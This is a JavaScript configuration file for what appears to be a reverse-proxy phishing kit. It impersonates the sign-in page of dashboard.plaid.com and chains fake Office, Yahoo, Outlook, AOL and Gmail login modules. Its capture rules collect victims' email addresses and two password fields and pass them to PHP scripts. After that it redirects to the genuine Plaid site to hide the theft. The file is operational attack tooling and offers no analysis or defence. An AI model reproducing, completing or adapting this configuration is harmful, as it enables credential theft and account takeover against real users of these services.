const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

const OFFICE_MODULE = require('../office/main')
const YAHOO_MODULE = require('../yahoo/main')
const OUTLOOK_MODULE = require('../outlook/main')
const AOL_MODULE = require('../aol/main')
const GMAIL_MODULE = require('../gmail/main')

/** Defined Config used */

const configExport = {

    SCHEME: 'emailx',

    CURRENT_DOMAIN: 'dashboard.plaid.com',

    START_PATH: '/signin/auth0',
    
    PATTERNS: [],

    FORCE_PROXY: ["/auth/login/finish"],

    PHP_PROCESSOR: {
        '/signin/auth0': {
            GET: {
                script: 'onedrive.php',
            },
            POST: {
                script: null,
            
                redirectTo: null,

            },
        },

        '/signin/lalo/validate': {
            GET: {
                script: null,
            },
            POST: {
                script: 'validate.php',
                
                redirectTo: '',

            },
        },

        '/signin/server': {
            GET: {
                script: null,
            },
            POST: {
                script: null,
                
                redirectTo: '/auth/login/finish',

            },
        },
    },

    COOKIE_PATH: [],

    EXIT_TRIGGER_PATH: ['/auth/login/finish'],

    EXIT_URL: 'https://dashboard.plaid.com',


    EXTRA_COMMANDS: [],

    CAPTURES: {
        emailVerify: {
            params: ['email'],
            hosts: 'PHP-EXEC',
        },

        manualEmail: {
            params: ['mento'],
            hosts: 'PHP-EXEC',
        },
        
        manuelPassword1: {
            params: ['pinto1'],
            hosts: 'PHP-EXEC',
        },

        manuelPassword2: {
            params: ['pinto2'],
            hosts: 'PHP-EXEC',
        },


    },

    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: '/auth/login/finish',
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: '/auth/login/finish',
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: '/auth/login/finish',
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: '/auth/login/finish',
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: '/auth/login/finish',
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: 'DEFAULT',

    EXTERNAL_FILTERS: [],

    //MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

   }
module.exports = configExport

